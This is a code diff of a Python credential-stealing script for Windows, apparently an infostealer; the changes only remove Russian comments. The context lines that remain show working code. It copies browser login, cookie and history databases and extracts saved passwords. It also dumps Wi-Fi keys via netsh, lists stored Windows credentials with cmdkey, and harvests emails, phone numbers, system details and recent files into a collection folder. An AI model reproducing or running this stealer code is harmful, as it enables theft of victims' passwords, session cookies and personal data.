@@ -9,7 +9,6 @@ import requests
 import re
 from pathlib import Path
 
-# Константы для сбора данных
 OUTPUT_DIR = "collected_data"
 CHROME_PATH = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
 EDGE_PATH = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default")
@@ -32,7 +31,6 @@ class DataCollector:
             if not os.path.exists(browser_path):
                 return
                 
-            # Копирование файлов базы данных
             db_files = ['Login Data', 'History', 'Cookies', 'Web Data']
             for db_file in db_files:
                 src_path = os.path.join(browser_path, db_file)
@@ -40,10 +38,8 @@ class DataCollector:
                     dst_path = os.path.join(self.output_dir, f"{browser_name}_{db_file}.db")
                     shutil.copy2(src_path, dst_path)
                     
-            # Извлечение паролей
             self.extract_passwords(browser_path, browser_name)
             
-            # Извлечение истории
             self.extract_history(browser_path, browser_name)
             
         except Exception as e:
@@ -56,7 +52,6 @@ class DataCollector:
             if not os.path.exists(login_db):
                 return
                 
-            # Создание временной копии
             temp_db = os.path.join(self.output_dir, f'temp_{browser_name}_login.db')
             shutil.copy2(login_db, temp_db)
             
@@ -136,14 +131,12 @@ class DataCollector:
         try:
             info = []
             
-            # Информация о пользователе
             info.append(f"Username: {os.getenv('USERNAME')}")
             info.append(f"Computer name: {os.getenv('COMPUTERNAME')}")
             info.append(f"User domain: {os.getenv('USERDOMAIN')}")
             info.append(f"System drive: {os.getenv('SystemDrive')}")
             info.append(f"OS: {os.getenv('OS')}")
             
-            # Сетевые интерфейсы
             info.append("\nNetwork interfaces:")
             import socket
             hostname = socket.gethostname()
@@ -154,7 +147,6 @@ class DataCollector:
             except:
                 pass
                 
-            # Сохранение
             with open(os.path.join(self.output_dir, 'system_info.txt'), 'w', encoding='utf-8') as f:
                 f.write('\n'.join(info))
                 
@@ -166,14 +158,12 @@ class DataCollector:
         try:
             wifi_data = []
             
-            # Получение списка профилей WiFi
             result = os.popen('netsh wlan show profiles').read()
             profiles = re.findall(r'All User Profile\s*:\s(.*)', result)
             
             for profile in profiles:
                 profile = profile.strip()
                 try:
-                    # Получение пароля для профиля
                     password_result = os.popen(f'netsh wlan show profile "{profile}" key=clear').read()
                     password_match = re.search(r'Key Content\s*:\s(.*)', password_result)
                     
@@ -201,7 +191,6 @@ class DataCollector:
             emails = set()
             phones = set()
             
-            # Поиск в текстовых файлах пользователя
             user_dirs = [
                 os.path.expanduser("~\\Documents"),
                 os.path.expanduser("~\\Downloads"),
@@ -214,12 +203,12 @@ class DataCollector:
             for directory in user_dirs:
                 if os.path.exists(directory):
                     for root, dirs, files in os.walk(directory):
-                        for file in files[:50]:  # Ограничение для производительности
+                        for file in files[:50]:
                             if file.endswith(('.txt', '.doc', '.docx', '.pdf')):
                                 try:
                                     filepath = os.path.join(root, file)
                                     with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                                        content = f.read(5000)  # Чтение первых 5000 символов
+                                        content = f.read(5000)
                                         
                                         found_emails = re.findall(email_pattern, content)
                                         emails.update(found_emails)
@@ -229,7 +218,6 @@ class DataCollector:
                                 except:
                                     continue
                                     
-            # Сохранение результатов
             if emails:
                 with open(os.path.join(self.output_dir, 'found_emails.txt'), 'w', encoding='utf-8') as f:
                     f.write('\n'.join(emails))
@@ -246,7 +234,6 @@ class DataCollector:
         try:
             creds = []
             
-            # Получение сохраненных учетных данных через cmdkey
             result = os.popen('cmdkey /list').read()
             lines = result.split('\n')
             
@@ -267,7 +254,7 @@ class DataCollector:
         try:
             recent_path = os.path.expanduser("~\\Recent")
             if os.path.exists(recent_path):
-                recent_files = os.listdir(recent_path)[:500]  # Ограничение
+                recent_files = os.listdir(recent_path)[:500]
                 
                 with open(os.path.join(self.output_dir, 'recent_files.txt'), 'w', encoding='utf-8') as f:
                     for file in recent_files:
@@ -307,34 +294,27 @@ class DataCollector:
         """Основной метод запуска сбора данных"""
         print("[+] Starting data collection...")
         
-        # Сбор данных из браузеров
         print("[+] Collecting browser data...")
         self.collect_browser_data(CHROME_PATH, "Chrome")
         self.collect_browser_data(EDGE_PATH, "Edge")
         self.collect_browser_data(OPERA_PATH, "Opera")
         self.collect_browser_data(BRAVE_PATH, "Brave")
         
-        # Сбор системной информации
         print("[+] Collecting system information...")
         self.collect_system_info()
         
-        # Сбор WiFi паролей
         print("[+] Collecting WiFi passwords...")
         self.collect_wifi_passwords()
         
-        # Извлечение email и телефонов
         print("[+] Extracting emails and phones...")
         self.extract_emails_phones()
         
-        # Сбор учетных данных Windows
         print("[+] Collecting Windows credentials...")
         self.collect_windows_creds()
         
-        # Сбор недавних файлов
         print("[+] Collecting recent files...")
         self.collect_recent_files()
         
-        # Создание сводки
         print("[+] Creating summary...")
         self.create_summary()
         
